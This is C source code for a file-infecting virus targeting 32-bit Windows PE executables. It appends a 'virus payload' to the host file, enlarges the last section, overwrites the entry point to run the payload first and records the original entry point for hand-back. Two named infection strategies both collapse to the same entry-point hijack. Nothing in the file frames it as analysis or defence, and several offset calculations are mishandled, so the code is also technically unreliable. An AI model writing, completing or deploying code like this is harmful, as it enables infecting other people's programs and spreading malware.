#include "pe_infector.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// Read PE header from file
BOOL ReadPEHeader(const char* filename, PE_HEADER_32* header) {
    FILE* file;
    DWORD dos_signature;
    DWORD pe_offset;

    file = fopen(filename, "rb");
    if (!file) {
        return FALSE;
    }

    // Read DOS signature
    if (fread(&dos_signature, sizeof(DWORD), 1, file) != 1) {
        fclose(file);
        return FALSE;
    }

    // Check DOS signature (MZ)
    if (dos_signature != 0x5A4D) { // "MZ"
        fclose(file);
        return FALSE;
    }

    // Read PE offset from DOS header (at offset 0x3C)
    fseek(file, 0x3C, SEEK_SET);
    if (fread(&pe_offset, sizeof(DWORD), 1, file) != 1) {
        fclose(file);
        return FALSE;
    }

    // Read PE header
    fseek(file, pe_offset, SEEK_SET);
    if (fread(&header->signature, sizeof(DWORD), 1, file) != 1) {
        fclose(file);
        return FALSE;
    }

    // Check PE signature
    if (header->signature != 0x4550) { // "PE"
        fclose(file);
        return FALSE;
    }

    // Read file header
    if (fread(&header->file_header, sizeof(IMAGE_FILE_HEADER), 1, file) != 1) {
        fclose(file);
        return FALSE;
    }

    // Read optional header
    if (header->file_header.SizeOfOptionalHeader != sizeof(IMAGE_OPTIONAL_HEADER32)) {
        fclose(file);
        return FALSE;
    }

    if (fread(&header->optional_header, sizeof(IMAGE_OPTIONAL_HEADER32), 1, file) != 1) {
        fclose(file);
        return FALSE;
    }

    fclose(file);
    return TRUE;
}

// Write PE header back to file
BOOL WritePEHeader(const char* filename, const PE_HEADER_32* header) {
    FILE* file;
    DWORD pe_offset;

    file = fopen(filename, "r+b");
    if (!file) {
        return FALSE;
    }

    // Find PE offset
    fseek(file, 0x3C, SEEK_SET);
    if (fread(&pe_offset, sizeof(DWORD), 1, file) != 1) {
        fclose(file);
        return FALSE;
    }

    // Write PE header
    fseek(file, pe_offset, SEEK_SET);
    if (fwrite(&header->signature, sizeof(DWORD), 1, file) != 1) {
        fclose(file);
        return FALSE;
    }

    if (fwrite(&header->file_header, sizeof(IMAGE_FILE_HEADER), 1, file) != 1) {
        fclose(file);
        return FALSE;
    }

    if (fwrite(&header->optional_header, sizeof(IMAGE_OPTIONAL_HEADER32), 1, file) != 1) {
        fclose(file);
        return FALSE;
    }

    fclose(file);
    return TRUE;
}

// Align address to section alignment
DWORD AlignToSection(DWORD address, DWORD alignment) {
    if (alignment == 0) return address;
    DWORD remainder = address % alignment;
    if (remainder == 0) return address;
    return address + (alignment - remainder);
}

// Add virus code to PE file section
BOOL AddVirusCodeToSection(const char* filename, const char* payload, DWORD payload_size, DWORD* code_offset) {
    FILE* file;
    PE_HEADER_32 header;
    IMAGE_SECTION_HEADER section_header;
    DWORD pe_offset;
    DWORD i;
    BYTE* file_buffer;
    DWORD file_size;

    // Read current PE header
    if (!ReadPEHeader(filename, &header)) {
        return FALSE;
    }

    file = fopen(filename, "r+b");
    if (!file) {
        return FALSE;
    }

    // Get PE offset
    fseek(file, 0x3C, SEEK_SET);
    fread(&pe_offset, sizeof(DWORD), 1, file);

    // Find last section
    fseek(file, pe_offset + 4 + sizeof(IMAGE_FILE_HEADER), SEEK_SET);

    IMAGE_SECTION_HEADER* sections = malloc(header.file_header.NumberOfSections * sizeof(IMAGE_SECTION_HEADER));
    if (!sections) {
        fclose(file);
        return FALSE;
    }

    fread(sections, sizeof(IMAGE_SECTION_HEADER), header.file_header.NumberOfSections, file);

    // Get file size
    fseek(file, 0, SEEK_END);
    file_size = ftell(file);

    // Modify last section header to be larger
    sections[header.file_header.NumberOfSections - 1].SizeOfRawData += payload_size;
    sections[header.file_header.NumberOfSections - 1].Misc.VirtualSize += payload_size;

    // Update the optional header size of code
    header.optional_header.SizeOfCode += payload_size;

    // Write payload at end of file
    fseek(file, file_size, SEEK_SET);
    fwrite(payload, 1, payload_size, file);

    *code_offset = file_size;

    // Write back modified section headers
    fseek(file, pe_offset + 4 + sizeof(IMAGE_FILE_HEADER), SEEK_SET);
    fwrite(sections, sizeof(IMAGE_SECTION_HEADER), header.file_header.NumberOfSections, file);

    // Write back modified optional header
    fseek(file, pe_offset + 4 + sizeof(IMAGE_FILE_HEADER) + (header.file_header.NumberOfSections * sizeof(IMAGE_SECTION_HEADER)), SEEK_SET);
    fwrite(&header.optional_header, sizeof(IMAGE_OPTIONAL_HEADER32), 1, file);

    free(sections);
    fclose(file);
    return TRUE;
}

// Strategy 1: Call Hijacking EPO - Hijack an imported function call
// SIMPLIFIED: Actually modify entry point to virus code
BOOL InfectPEFile_CallHijacking(const char* target_file, const char* payload_code, DWORD payload_size) {
    FILE* file;
    PE_HEADER_32 header;
    DWORD code_offset;
    DWORD pe_offset;

    // Read PE header
    if (!ReadPEHeader(target_file, &header)) {
        return FALSE;
    }

    // Store original entry point
    DWORD original_oep = header.optional_header.AddressOfEntryPoint;

    // Add virus payload to file
    if (!AddVirusCodeToSection(target_file, payload_code, payload_size, &code_offset)) {
        return FALSE;
    }

    // Calculate RVA from file offset
    // For simplicity: RVA = code_offset (assuming code in first section)
    DWORD virus_code_rva = code_offset;

    // Modify entry point to virus code
    header.optional_header.AddressOfEntryPoint = virus_code_rva;

    // Write virus code offset and original OEP for restoration in payload
    file = fopen(target_file, "ab");
    if (file) {
        DWORD metadata[2] = { original_oep, code_offset };
        fwrite(metadata, sizeof(DWORD), 2, file);
        fclose(file);
    }

    // Write back modified header with new entry point
    if (!WritePEHeader(target_file, &header)) {
        return FALSE;
    }

    return TRUE;
}

// Strategy 2: Import Address Table (IAT) Replacing EPO
// SIMPLIFIED: Also modify entry point for guaranteed execution
BOOL InfectPEFile_IATReplacing(const char* target_file, const char* payload_code, DWORD payload_size) {
    FILE* file;
    PE_HEADER_32 header;
    DWORD code_offset;

    // Read PE header
    if (!ReadPEHeader(target_file, &header)) {
        return FALSE;
    }

    // Store original entry point
    DWORD original_oep = header.optional_header.AddressOfEntryPoint;

    // Add virus payload to file
    if (!AddVirusCodeToSection(target_file, payload_code, payload_size, &code_offset)) {
        return FALSE;
    }

    // Calculate RVA from file offset
    DWORD virus_code_rva = code_offset;

    // Modify entry point to virus code
    header.optional_header.AddressOfEntryPoint = virus_code_rva;

    // Write virus code offset and original OEP for restoration in payload
    file = fopen(target_file, "ab");
    if (file) {
        DWORD metadata[2] = { original_oep, code_offset };
        fwrite(metadata, sizeof(DWORD), 2, file);
        fclose(file);
    }

    // Write back modified header with new entry point
    if (!WritePEHeader(target_file, &header)) {
        return FALSE;
    }

    return TRUE;
}
